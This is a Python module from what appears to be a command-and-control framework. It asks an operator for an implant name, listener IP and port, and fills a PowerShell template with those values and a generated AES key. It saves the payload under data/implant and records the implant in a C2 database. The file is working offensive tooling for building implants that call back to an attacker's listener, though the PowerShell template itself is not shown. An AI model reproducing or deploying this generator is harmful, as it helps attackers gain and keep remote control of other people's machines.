from genericpath import isdir
import C2Database
import color
import os, random, string, base64


def GeneratePayload(implantname, key, listenername, listenerip, listenerport):
    powershellpayload = open("powershell.ps1", "r").read().replace("REPLACE_KEY", key).replace("REPLACE_IP",listenerip).replace("REPLACE_PORT",str(listenerport)).replace("REPLACE_NAME",implantname)
    
    with open("data/implant/%s/payload.ps1" % implantname, "w") as file:
        file.write(powershellpayload)
    
    C2 = C2Database.ConnectDatabase()

    C2.SaveImplant(implantname, key, listenername, listenerip, listenerport)

def GenerateImplant():
    implantname = input(color.red("\n[+] What do you want to name your implant: "))
    key = AESKEY
    listenername = input(color.green("[+] What is the name of the listener for this implant: "))
    listenerip = input(color.blue("[+] What is the ip this implant will reach out to: "))
    listenerport = input(color.yellow("[+] What port will this implant reach out to: "))
    implantlang = input(color.cyan("[+] What is the language you want this implant in (Only Support Powershell For Now, So Type Powershell!): ")).lower()

    try:
        if os.path.isdir("data"):
            if os.path.isdir("data/implant"):
                print(color.yellow("\n[+] The data/implant path is found, there are no worries and we created the new implant!"))
                os.mkdir("data/implant/%s" % implantname)
        else:
            print(color.yellow("\n[+] The data/implant path was not found, no worries though we created it for you!"))
            os.mkdir("data")
            os.mkdir("data/implant")
            os.mkdir("data/implant/%s" % implantname)

        if implantlang == "powershell":
            GeneratePayload(implantname, key, listenername, listenerip, listenerport)
            print(color.red("\n[+] The payload for the implant called {} has been created inside of the following path data/implant/{}/payload.ps1!\n").format(implantname, implantname))
    except:
        print("There was an error")

def key_generator():
    key = base64.b64encode(os.urandom(32)).decode()
    return key

AESKEY = key_generator()